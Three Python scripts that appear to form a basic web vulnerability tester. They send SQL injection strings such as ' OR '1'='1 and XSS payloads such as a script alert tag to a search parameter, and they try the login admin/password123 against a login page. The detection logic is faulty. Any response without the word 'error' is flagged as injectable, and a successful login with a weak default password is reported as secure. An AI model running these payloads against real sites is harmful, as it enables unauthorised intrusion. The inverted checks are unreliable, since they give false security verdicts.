```python
import requests

# Function to test SQL injection
def test_sql_injection(url, param):
    payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*"]
    for payload in payloads:
        target_url = f"{url}?{param}={payload}"
        response = requests.get(target_url)
        if "error" not in response.text.lower():
            print(f"Potential SQL injection vulnerability found with payload: {payload}")
        else:
            print(f"No vulnerability found with payload: {payload}")

# Example usage
url = 'http://example.com/search'
param = 'q'
test_sql_injection(url, param)
```

```python
import requests
from bs4 import BeautifulSoup

# Function to test XSS
def test_xss(url, param):
    payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
    for payload in payloads:
        target_url = f"{url}?{param}={payload}"
        response = requests.get(target_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        if payload in str(soup):
            print(f"Potential XSS vulnerability found with payload: {payload}")
        else:
            print(f"No vulnerability found with payload: {payload}")

# Example usage
url = 'http://example.com/search'
param = 'q'
test_xss(url, param)
```

```python
import requests

# Function to test for insecure authentication
def test_insecure_authentication(login_url, username, password):
    payload = {'username': username, 'password': password}
    response = requests.post(login_url, data=payload)
    if "Login successful" in response.text:
        print("Authentication mechanism is secure.")
    else:
        print("Potential insecure authentication mechanism found.")

# Example usage
login_url = 'http://example.com/login'
username = 'admin'
password = 'password123'
test_insecure_authentication(login_url, username, password)
```
